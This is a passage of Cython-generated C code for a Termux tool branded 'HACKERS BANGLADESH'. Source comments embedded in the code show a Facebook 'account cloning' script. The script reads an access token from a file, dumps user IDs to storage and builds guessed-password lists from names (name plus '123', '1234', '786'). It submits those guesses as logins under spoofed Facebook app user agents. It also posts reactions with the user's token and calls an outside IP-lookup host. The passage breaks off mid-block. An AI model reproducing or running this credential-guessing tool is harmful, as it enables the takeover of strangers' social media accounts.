 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_19__login__, 0, __pyx_n_s_James___login, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__86)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 327, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_login, __pyx_t_9) < 0) __PYX_ERR(0, 327, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":340
 * 			print("  [!]  Token Invalid")
 * 			self.login()
 * 	def __bot__follow__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open("login.txt","r").read()
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_21__bot__follow__, 0, __pyx_n_s_James___bot__follow, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__88)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_bot__follow, __pyx_t_9) < 0) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":357
 * 		requests.post('https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=' + token) #react
 * 		self.__menu__file__()
 * 	def __menu__file__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_23__menu__file__, 0, __pyx_n_s_James___menu__file, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__90)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_menu__file, __pyx_t_9) < 0) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":392
 * 			self.__login__()
 * 
 * 	def __method__2__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  \033[0;97m[1] Clone only 10000 to 10000000 account")
 * 		print("  [2] Clone All in one Account")
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_25__method__2__, 0, __pyx_n_s_James___method__2, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__92)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 392, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_method__2, __pyx_t_9) < 0) __PYX_ERR(0, 392, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":407
 * 		elif __method__2__ == "3":
 * 			self.__menn__()
 * 	def __masal__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_27__masal__, 0, __pyx_n_s_James___masal, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__94)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 407, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_masal, __pyx_t_9) < 0) __PYX_ERR(0, 407, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":436
 * 		print("  \033[0;97m[] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 * 	def __1000__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/1000.txt'
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_29__1000__, 0, __pyx_n_s_James___1000, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__96)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 436, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_1000, __pyx_t_9) < 0) __PYX_ERR(0, 436, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":473
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __masal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_31__masal2__, 0, __pyx_n_s_James___masal2, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__99)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 473, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_masal2, __pyx_t_9) < 0) __PYX_ERR(0, 473, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":501
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(____))
 * 	def __Frr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f2.txt'
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_33__Frr__, 0, __pyx_n_s_James___Frr, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__101)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 501, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_Frr, __pyx_t_9) < 0) __PYX_ERR(0, 501, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":537
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __menn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_35__menn__, 0, __pyx_n_s_James___menn, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__103)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 537, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_menn, __pyx_t_9) < 0) __PYX_ERR(0, 537, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":574
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __bapi__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_37__bapi__, 0, __pyx_n_s_James___bapi, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__105)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 574, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_bapi, __pyx_t_9) < 0) __PYX_ERR(0, 574, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":618
 * 
 * 		self.loop += 1
 * 	def __method__1__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_39__method__1__, 0, __pyx_n_s_James___method__1, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__107)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 618, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_method__1, __pyx_t_9) < 0) __PYX_ERR(0, 618, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":633
 * 		elif __method__1__ == "3":
 * 			self.__mennn__()
 * 	def __10007__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_41__10007__, 0, __pyx_n_s_James___10007, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__109)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 633, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_10007, __pyx_t_9) < 0) __PYX_ERR(0, 633, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":662
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 * 	def __10000__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/100.txt'
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_43__10000__, 0, __pyx_n_s_James___10000, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__111)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 662, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_10000_2, __pyx_t_9) < 0) __PYX_ERR(0, 662, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":699
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __ma__sal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_45__ma__sal2__, 0, __pyx_n_s_James___ma__sal2, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__114)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 699, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_ma__sal2, __pyx_t_9) < 0) __PYX_ERR(0, 699, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":727
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Frrr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f_2.txt'
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_47__Frrr__, 0, __pyx_n_s_James___Frrr, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__116)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 727, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_Frrr, __pyx_t_9) < 0) __PYX_ERR(0, 727, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":763
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __mennn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_49__mennn__, 0, __pyx_n_s_James___mennn, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__118)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 763, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_mennn, __pyx_t_9) < 0) __PYX_ERR(0, 763, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":799
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __file__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_51__file__, 0, __pyx_n_s_James___file, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__120)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 799, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_file, __pyx_t_9) < 0) __PYX_ERR(0, 799, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":846
 * 
 * 		self.loop+=1
 * 	def __33__3__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_53__33__3__, 0, __pyx_n_s_James___33__3, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__122)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 846, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_33__3, __pyx_t_9) < 0) __PYX_ERR(0, 846, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":861
 * 		elif __33__33__ == "3":
 * 			self.__me__nnn__()
 * 	def __100__07__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_55__100__07__, 0, __pyx_n_s_James___100__07, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__124)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 861, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_100__07, __pyx_t_9) < 0) __PYX_ERR(0, 861, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":890
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 * 	def __100__00__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/10_0.txt'
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_57__100__00__, 0, __pyx_n_s_James___100__00, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__126)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 890, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_100__00, __pyx_t_9) < 0) __PYX_ERR(0, 890, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":926
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __ma___sal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_59__ma___sal2__, 0, __pyx_n_s_James___ma___sal2, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__128)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 926, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_ma___sal2, __pyx_t_9) < 0) __PYX_ERR(0, 926, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":954
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Fr__rr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_61__Fr__rr__, 0, __pyx_n_s_James___Fr__rr, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__130)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 954, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_Fr__rr, __pyx_t_9) < 0) __PYX_ERR(0, 954, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":990
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __me__nnn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_63__me__nnn__, 0, __pyx_n_s_James___me__nnn, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__132)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 990, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_me__nnn, __pyx_t_9) < 0) __PYX_ERR(0, 990, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":1027
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __f_james__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_65__f_james__, 0, __pyx_n_s_James___f_james, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__134)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1027, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_f_james, __pyx_t_9) < 0) __PYX_ERR(0, 1027, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":1073
 * 				continue
 * 		self.loop+=1
 * 	def main_coeg():             # <<<<<<<<<<<<<<
 * 		os.system("git pull")
 * 		os.system("touch login.txt")
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_67main_coeg, 0, __pyx_n_s_James_main_coeg, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__135)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1073, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_main_coeg, __pyx_t_9) < 0) __PYX_ERR(0, 1073, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":61
 * bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 * class James:             # <<<<<<<<<<<<<<
 * 	def __init__(self):
 * 		self.id = []
 */
  __pyx_t_9 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_James, __pyx_empty_tuple, __pyx_t_7, NULL, 0, 1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_James, __pyx_t_9) < 0) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "libme.pyx":1080
 * 		try:os.mkdir("OK")
 * 		except:pass
 * try:             # <<<<<<<<<<<<<<
 * 	James().__request__()
 * except Exception as e:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":1081
 * 		except:pass
 * try:
 * 	James().__request__()             # <<<<<<<<<<<<<<
 * except Exception as e:
 * 	exit(str(e))
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_James); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1081, __pyx_L45_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1081, __pyx_L45_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_request); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1081, __pyx_L45_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1081, __pyx_L45_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

      /* "libme.pyx":1080
 * 		try:os.mkdir("OK")
 * 		except:pass
 * try:             # <<<<<<<<<<<<<<
 * 	James().__request__()
 * except Exception as e:
 */
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L50_try_end;
    __pyx_L45_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":1082
 * try:
 * 	James().__request__()
 * except Exception as e:             # <<<<<<<<<<<<<<
 * 	exit(str(e))
 */
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_6) {
      __Pyx_AddTraceback("libme", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_9, &__pyx_t_7, &__pyx_t_8) < 0) __PYX_ERR(0, 1082, __pyx_L47_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_8);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_t_7) < 0) __PYX_ERR(0, 1082, __pyx_L47_except_error)

      /* "libme.pyx":1083
 * 	James().__request__()
 * except Exception as e:
 * 	exit(str(e))             # <<<<<<<<<<<<<<
 */
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_e); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1083, __pyx_L47_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1083, __pyx_L47_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1083, __pyx_L47_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      goto __pyx_L46_exception_handled;
    }
    goto __pyx_L47_except_error;
    __pyx_L47_except_error:;

    /* "libme.pyx":1080
